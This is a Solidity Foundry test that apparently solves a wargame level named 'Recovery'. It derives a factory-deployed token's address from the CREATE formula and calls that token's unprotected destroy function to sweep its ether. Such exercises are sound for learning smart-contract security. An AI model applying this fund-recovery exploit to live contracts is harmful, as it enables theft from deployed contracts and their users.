// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Recovery, SimpleToken} from "../src/contracts/17_Recovery.sol";

contract PreservationTest is Test {
    address private owner = makeAddr("owner");
    Recovery private recovery;

    function setUp() public {
        recovery = new Recovery();

        vm.prank(owner);
        deal(owner, 0.001 ether);
        recovery.generateToken("Test", 10);
    }

    function test_RecoveryExploitVulnerability() public {
        // to retrieve a contract's address which is deployed by another contract
        // we can use the formula for standard creation with CREATE opcode
        // CREATE opcode relies only on the deployer's address and the nonce of the transaction
        // keccak256(0xD6 + 0x94 + <deployer address> + <nonce>)
        // nonce is 1 beacuse we assume that the first thing we do is deploying our SimpleToken, so this will be our first transaction
        address payable simpleTokenAddress = payable(
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                hex"d694",
                                address(recovery),
                                uint8(1)
                            )
                        )
                    )
                )
            )
        );

        // check if such address exists -> if code size is > 0
        if (simpleTokenAddress.code.length <= 0) {
            revert();
        }

        vm.prank(owner);
        (bool success, ) = simpleTokenAddress.call{value: 0.001 ether}("");

        if (!success) {
            revert();
        }

        assertEq(owner.balance, 0);
        assertEq(SimpleToken(simpleTokenAddress).balances(owner), 1e16);

        SimpleToken(simpleTokenAddress).destroy(payable(owner));

        assertEq(owner.balance, 0.001 ether);
    }
}
